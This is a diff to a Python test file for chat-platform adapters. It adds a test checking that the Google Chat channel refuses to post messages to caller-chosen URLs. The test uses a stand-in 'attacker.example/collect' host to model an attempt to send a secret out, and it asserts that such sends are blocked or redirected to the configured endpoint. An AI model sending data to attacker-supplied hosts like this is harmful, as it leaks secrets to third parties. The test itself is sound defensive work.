@@ -100,3 +100,34 @@ def test_new_native_adapters_parse_normalized_messages():
     assert MicrosoftTeamsChannel(MicrosoftTeamsConfig()).parse_webhook({"type": "message", "id": "a1", "from": {"id": "u1"}, "conversation": {"id": "conv"}, "text": "teams hi"}).text == "teams hi"
     assert MatrixChannel(MatrixConfig()).parse_webhook({"event": {"event_id": "$1", "sender": "@u:example", "room_id": "!r:example", "content": {"msgtype": "m.text", "body": "matrix hi"}}}).text == "matrix hi"
     assert QQChannel(QQConfig()).parse_webhook({"d": {"id": "m1", "author": {"id": "u1"}, "group_openid": "g1", "content": "qq hi"}}).text == "qq hi"
+
+
+def test_google_chat_never_posts_to_caller_chosen_urls(monkeypatch):
+    import asyncio
+    import pytest
+
+    posted: list[str] = []
+
+    class Http:
+        async def post(self, url, **kwargs):
+            posted.append(url)
+
+            class Result:
+                data = {"name": "m1"}
+                request_id = "r1"
+
+            return Result()
+
+    monkeypatch.delenv(GoogleChatConfig().incoming_webhook_url_env, raising=False)
+    channel = GoogleChatChannel(GoogleChatConfig())
+    channel.http = Http()
+    with pytest.raises(PermissionError):
+        asyncio.run(channel.send_text("https://attacker.example/collect", "secret"))
+    asyncio.run(channel.send_text("https://chat.googleapis.com/v1/spaces/AAA/messages?key=k", "hi", webhook_url="https://attacker.example"))
+    assert posted == ["https://chat.googleapis.com/v1/spaces/AAA/messages?key=k"]
+
+    monkeypatch.setenv(GoogleChatConfig().incoming_webhook_url_env, "https://chat.googleapis.com/v1/spaces/CFG/messages")
+    configured = GoogleChatChannel(GoogleChatConfig())
+    configured.http = Http()
+    asyncio.run(configured.send_text("anything", "hi", webhook_url="https://attacker.example"))
+    assert posted[-1] == "https://chat.googleapis.com/v1/spaces/CFG/messages"
